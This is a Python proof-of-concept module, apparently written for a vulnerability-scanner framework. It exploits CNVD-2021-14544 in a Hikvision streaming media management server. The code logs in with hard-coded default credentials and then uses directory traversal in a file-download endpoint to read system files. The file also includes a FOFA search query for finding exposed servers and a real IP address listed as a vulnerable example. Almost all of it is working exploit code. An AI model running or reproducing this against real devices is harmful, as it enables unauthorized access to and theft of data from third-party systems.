# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "HIKVISION 流媒体管理服务器任意文件读取",                        # 漏洞名称
        "VulnID" : "CNVD-2021-14544",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "HIKVISION 流媒体管理服务器",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，
            攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="流媒体管理服务器"
        """,                     # fofa搜索语句
        "example" : "http://211.141.18.23:7788",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/data/login.php" # url自己按需调整
        url1 = self.target + "/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini" # url自己按需调整

        data = "userName=YWRtaW4=&password=MTIzNDU="

        headers0 = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data,headers = headers0 , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and req0.text == "0":
                # print(req0.headers+"yes")
                headers1 = {"Cookie":"{phpsession}".format(phpsession = req0.headers["Set-Cookie"].split(",")[2].split(";")[0].strip())}
                req1 = requests.get(url1,headers = headers1 , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if "; for 16-bit app support" in req1.text:
                    vuln = [True,req1.text]
                else:
                    vuln = [False,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()